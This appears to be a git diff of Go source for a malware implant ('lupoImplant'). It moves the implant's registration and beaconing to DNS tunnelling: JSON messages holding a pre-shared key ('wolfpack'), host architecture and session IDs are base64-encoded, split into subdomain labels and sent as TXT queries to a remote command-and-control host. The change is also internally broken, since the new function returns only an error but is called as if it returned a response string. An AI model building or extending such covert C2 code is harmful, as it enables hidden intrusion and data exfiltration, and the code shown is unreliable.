@@ -60,27 +60,21 @@ func ExecLoop(implant *lupoImplant){
 
 	if implant.id == -1{
 
-
-	   /*
+	   
 		arch := getArchitecture()
 
 		// Build custom user defined functions
 		customFunctions := buildCustomFunctions()
 
 		message := "{\"psk\":\"" + implant.psk + "\",\"register\":true,\"update\":" + strconv.Itoa(implant.updateInterval) + ",\"arch\":\"" + arch + "\",\"functions\":\"" + customFunctions + "\"}"
-		subdomain := encodeBase64(message)*/
 
-		//arch := getArchitecture()
-
-		// Build custom user defined functions
-		//customFunctions := buildCustomFunctions()
-
-		message := "{\"psk\":\"" + implant.psk + "\",\"register\":true,\"update\":" + strconv.Itoa(implant.updateInterval) + "}"
+		//message := "{\"psk\":\"" + implant.psk + "\",\"register\":true,\"update\":" + strconv.Itoa(implant.updateInterval) + "}"
 		subdomain := encodeBase64(message)
 	
 		fqdn := subdomain + "." + implant.dns_domain // e.g., aGVsbG9fc2VydmVy.example.com.
 	
 		fmt.Println(fqdn)
+		/*
 		// Construct DNS message
 		m := new(dns.Msg)
 		m.Id = dns.Id()
@@ -96,47 +90,43 @@ func ExecLoop(implant *lupoImplant){
 		c := new(dns.Client)
 		c.Timeout = 5 * time.Second
 
-		resp, _, err := c.Exchange(m, connectionString)
+		*/
+		resp, err := sendSubdomainChunks(implant, subdomain)
 		if err != nil {
 			log.Fatalf("Failed to send DNS query: %v", err)
 		}
 
-		// Print response
-		fmt.Println("📤 Server Response:")
-		for _, ans := range resp.Answer {
-			if txt, ok := ans.(*dns.TXT); ok {
-				fmt.Println("TXT:", strings.Join(txt.Txt, " "))
-				
-				jsonData := strings.Join(txt.Txt, " ")
-
-				fmt.Println(strings.Join(txt.Txt, " "))
+		if (resp != ""){
+			jsonData, err := base64.RawURLEncoding.DecodeString(resp)
 
 
-				//jsonData, err := ioutil.ReadAll([]byte(respJoined))
+			//jsonData, err := ioutil.ReadAll([]byte(respJoined))
 
-				if err != nil {
-					return
-				}
-		
-				// Parse the JSON response
-				err = json.Unmarshal([]byte(jsonData), &serverResponse)
-		
-				if err != nil {
-					return
-				}
-
-				fmt.Println(jsonData)
-		
-				// set the new session info for the implant structure
-				implant.id = int(serverResponse["sessionID"].(float64))
-				implant.uuid = serverResponse["UUID"].(string)
+			if err != nil {
+				return
 			}
-		}
+	
+			// Parse the JSON response
+			err = json.Unmarshal(jsonData, &serverResponse)
+	
+			if err != nil {
+				return
+			}
 
+			fmt.Println(jsonData)
+	
+			// set the new session info for the implant structure
+			implant.id = int(serverResponse["sessionID"].(float64))
+			implant.uuid = serverResponse["UUID"].(string)
+
+			fmt.Println(implant.id)
+			fmt.Println(implant.uuid)
+			fmt.Println("In da register check")
+		}
 
 	}else{
 
-		message := "{\"psk\":\"wolfpack\",\"register\":true}"
+		message := "{\"psk\":\"wolfpack\",\"sessionID\":" + strconv.Itoa(implant.id) + ",\"UUID\":" + implant.uuid + "}"
 		subdomain := encodeBase64(message)
 
 		fqdn := subdomain + "." + implant.dns_domain // e.g., aGVsbG9fc2VydmVy.example.com.
@@ -218,3 +208,84 @@ func buildCustomFunctions() string {
 
 	return customFunctionStr
 }
+
+
+func chunkString(data string, maxPayload int) []string {
+	chunks := []string{}
+	totalChunks := (len(data) + maxPayload - 1) / maxPayload
+
+	for i := 0; i < totalChunks; i++ {
+		start := i * maxPayload
+		end := start + maxPayload
+		if end > len(data) {
+			end = len(data)
+		}
+		chunkData := data[start:end]
+		prefix := fmt.Sprintf("%d-%d-", i, totalChunks)
+		chunks = append(chunks, prefix+chunkData)
+	}
+
+	return chunks
+}
+
+
+func sendSubdomainChunks(implant *lupoImplant, fullPayload string) error {
+	
+	// Base64 encode full payload
+	fullBase64 := base64.RawURLEncoding.EncodeToString([]byte(fullPayload))
+
+	// Break fullBase64 into chunks of max 63 chars (DNS label limit)
+	const maxChunkSize = 63
+	var chunks []string
+	for i := 0; i < len(fullBase64); i += maxChunkSize {
+		end := i + maxChunkSize
+		if end > len(fullBase64) {
+			end = len(fullBase64)
+		}
+		chunks = append(chunks, fullBase64[i:end])
+	}
+
+	totalChunks := len(chunks)
+
+	connectionString := implant.rhost + ":" + strconv.Itoa(implant.rport)
+
+	for idx, chunk := range chunks {
+		// Build subdomain label: sessionID-chunkIndex-totalChunks-chunkBase64
+		subdomainLabel := fmt.Sprintf("%d-%d-%d-%s", implant.id, idx, totalChunks, chunk)
+
+		fqdn := subdomainLabel + "." + implant.dns_domain
+
+		m := new(dns.Msg)
+		m.Id = dns.Id()
+		m.RecursionDesired = false
+		m.Question = []dns.Question{
+			{
+				Name:   fqdn,
+				Qtype:  dns.TypeTXT,
+				Qclass: dns.ClassINET,
+			},
+		}
+
+		c := new(dns.Client)
+		c.Timeout = 5 * time.Second
+
+		resp, _, err := c.Exchange(m, connectionString)
+		if err != nil {
+			return fmt.Errorf("DNS query failed for chunk %d: %v", idx, err)
+		}
+
+		// Optionally read and handle server response TXT here if needed
+		for _, ans := range resp.Answer {
+			if txt, ok := ans.(*dns.TXT); ok {
+				// Handle server responses if your protocol expects it
+				log.Printf("Server response for chunk %d: %s", idx, strings.Join(txt.Txt, " "))
+			}
+		}
+
+		// Small sleep to avoid flooding DNS server, adjust as needed
+		time.Sleep(50 * time.Millisecond)
+	}
+
+	return nil
+}
+
